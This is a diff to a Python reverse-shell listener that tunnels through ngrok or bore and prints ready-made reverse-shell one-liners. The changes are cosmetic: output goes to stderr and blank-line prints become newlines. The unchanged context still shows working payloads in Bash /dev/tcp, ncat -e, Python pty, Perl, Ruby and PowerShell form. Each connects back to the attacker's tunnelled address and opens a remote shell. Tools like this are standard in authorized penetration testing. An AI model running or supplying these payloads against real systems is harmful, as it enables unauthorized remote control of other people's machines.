@@ -51,8 +51,8 @@ class Colors:
 
 
 def colored_print(text: str, color: str = Colors.WHITE):
-    """Print text with color"""
-    print(f"{color}{text}{Colors.END}")
+    """Print text with color to stderr"""
+    print(f"{color}{text}{Colors.END}", file=sys.stderr)
 
 
 def execute(conn: listen, cmd: str):
@@ -75,10 +75,9 @@ def check_ngrok_auth() -> bool:
             Colors.WHITE,
         )
         colored_print(
-            f'  - Run the script as "NGROK_AUTHTOKEN=<your-token> python {" ".join(sys.argv)}"',
+            f'  - Run the script as "NGROK_AUTHTOKEN=<your-token> python {" ".join(sys.argv)}"\n',
             Colors.WHITE,
         )
-        print()
         return False
 
     return True
@@ -168,16 +167,14 @@ def print_revshell_examples(
 ):
     """Print reverse shell examples"""
     colored_print(
-        "=============== REVSHELL EXAMPLES ===============", Colors.BOLD + Colors.PURPLE
+        "=============== REVSHELL EXAMPLES ===============\n", Colors.BOLD + Colors.PURPLE
     )
-    print()
 
     if not is_windows:
         colored_print("Bash:", Colors.CYAN)
         colored_print("────────────────────────────────────────────", Colors.WHITE)
         colored_print(f"bash -i >& /dev/tcp/{ip}/{public_port} 0>&1", Colors.YELLOW)
-        colored_print("────────────────────────────────────────────", Colors.WHITE)
-        print()
+        colored_print("────────────────────────────────────────────\n", Colors.WHITE)
 
     colored_print("Netcat:", Colors.CYAN)
     colored_print("────────────────────────────────────────────", Colors.WHITE)
@@ -188,8 +185,7 @@ def print_revshell_examples(
         f"ncat{'.exe' if is_windows else ''} {ip} {public_port} -e {shell}",
         Colors.YELLOW,
     )
-    colored_print("────────────────────────────────────────────", Colors.WHITE)
-    print()
+    colored_print("────────────────────────────────────────────\n", Colors.WHITE)
 
     if not is_windows:
         colored_print("Python:", Colors.CYAN)
@@ -198,8 +194,7 @@ def print_revshell_examples(
             f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{public_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
             Colors.YELLOW,
         )
-        colored_print("────────────────────────────────────────────", Colors.WHITE)
-        print()
+        colored_print("────────────────────────────────────────────\n", Colors.WHITE)
 
         colored_print("Perl:", Colors.CYAN)
         colored_print("────────────────────────────────────────────", Colors.WHITE)
@@ -207,8 +202,7 @@ def print_revshell_examples(
             f"""perl -e 'use Socket;$i="{ip}";$p={public_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");}};'""",
             Colors.YELLOW,
         )
-        colored_print("────────────────────────────────────────────", Colors.WHITE)
-        print()
+        colored_print("────────────────────────────────────────────\n", Colors.WHITE)
 
         colored_print("Ruby:", Colors.CYAN)
         colored_print("────────────────────────────────────────────", Colors.WHITE)
@@ -216,8 +210,7 @@ def print_revshell_examples(
             f"""ruby -rsocket -e'spawn("{shell}",[:in,:out,:err]=>TCPSocket.new("{ip}",{public_port}))'""",
             Colors.YELLOW,
         )
-        colored_print("────────────────────────────────────────────", Colors.WHITE)
-        print()
+        colored_print("────────────────────────────────────────────\n", Colors.WHITE)
 
     if not is_linux:
         colored_print("PowerShell:", Colors.CYAN)
@@ -226,15 +219,12 @@ def print_revshell_examples(
             f"""$client = New-Object System.Net.Sockets.TCPClient('{ip}',{public_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". {{ $data }} 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
             Colors.YELLOW,
         )
-        colored_print("────────────────────────────────────────────", Colors.WHITE)
-        print()
+        colored_print("────────────────────────────────────────────\n", Colors.WHITE)
 
-    colored_print("See more examples at https://www.revshells.com/", Colors.CYAN)
-    print()
+    colored_print("See more examples at https://www.revshells.com/\n", Colors.CYAN)
     colored_print(
-        "=================================================", Colors.BOLD + Colors.PURPLE
+        "=================================================\n", Colors.BOLD + Colors.PURPLE
     )
-    print()
 
 
 def upgrade_linux_shell(conn: listen):
@@ -392,8 +382,7 @@ def main():
             f'[!] Shell "{shell}" is unknown but will be shown in the examples.',
             Colors.YELLOW,
         )
-        colored_print("[!] Shell will not be attempted upgraded.", Colors.YELLOW)
-        print()
+        colored_print("[!] Shell will not be attempted upgraded.\n", Colors.YELLOW)
 
     # Set up tunnel based on selected type and register cleanup functions
     if args.tunnel == "bore":
@@ -403,8 +392,7 @@ def main():
         tunnel_obj, ip, public_port, hostname = setup_ngrok_tunnel(args.port)
         atexit.register(lambda: cleanup_ngrok(tunnel_obj))
 
-    colored_print(f"[+] Listening at {ip}:{public_port} ({hostname})...", Colors.GREEN)
-    print()
+    colored_print(f"[+] Listening at {ip}:{public_port} ({hostname})...\n", Colors.GREEN)
     
     if not args.quiet:
         print_revshell_examples(ip, public_port, shell, is_linux, is_windows)
